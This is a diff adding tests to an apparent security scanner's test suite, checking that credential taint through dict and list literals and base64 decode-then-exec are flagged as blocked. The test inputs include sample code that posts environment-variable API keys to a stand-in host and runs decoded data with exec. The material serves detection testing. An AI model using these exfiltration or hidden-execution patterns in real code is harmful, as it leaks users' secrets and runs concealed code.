@@ -365,8 +365,51 @@ def test_f7_allowlist_never_exonerates_credential_access(tmp_path):
 
 
 # ---------------------------------------------------------------------------
+# F8/F9 — taint sources nested in container literals still propagate
+# ({"k": os.environ[...]} / [blob] must taint the carrying name; otherwise
+# SEC-002 slips to WARN under a host allowlist and SEC-007 is missed)
+# ---------------------------------------------------------------------------
+
+def test_f8_env_dict_literal_exfil_blocked_under_allowlist(tmp_path):
+    allow = write_allow(tmp_path, ["host:mirror.example"])
+    rep = scan(tmp_path,
+               "import os\n"
+               "import requests\n"
+               "creds = {\"token\": os.environ[\"API_KEY\"]}\n"
+               "requests.post(\"http://mirror.example/upload\", data=creds)\n",
+               allow=allow)
+    assert rep["verdict"] == secscan.BLOCKED
+    ids = rule_ids(rep)
+    assert "SEC-002" in ids           # exfil via dict literal, never exonerated
+    assert "SEC-003" not in ids       # host is allowlisted
+
+
+def test_f8_env_list_literal_exfil_blocked_under_allowlist(tmp_path):
+    allow = write_allow(tmp_path, ["host:mirror.example"])
+    rep = scan(tmp_path,
+               "import os\n"
+               "import requests\n"
+               "creds = [os.environ[\"API_KEY\"], os.environ[\"TOKEN\"]]\n"
+               "requests.post(\"http://mirror.example/upload\", json=creds)\n",
+               allow=allow)
+    assert rep["verdict"] == secscan.BLOCKED
+    assert "SEC-002" in rule_ids(rep)
+
+
+def test_f9_b64_dict_reassembly_exec_blocked(tmp_path):
+    rep = scan(tmp_path,
+               "import codecs\n"
+               "blob = codecs.decode(\"cHJpbnQoJ2hlbGxvJyk=\", \"base64\")\n"
+               "payload = {\"data\": blob}\n"
+               "data = payload[\"data\"]\n"
+               "exec(data)\n")
+    assert rep["verdict"] == secscan.BLOCKED
+    assert "SEC-007" in rule_ids(rep)
+
+
+# ---------------------------------------------------------------------------
 # self-test regressions (the original 16 expectations must stay green,
-# plus the new F1..F7 cases)
+# plus the new F1..F9 cases)
 # ---------------------------------------------------------------------------
 
 def _evaluate_case(case, tmp_path) -> dict:
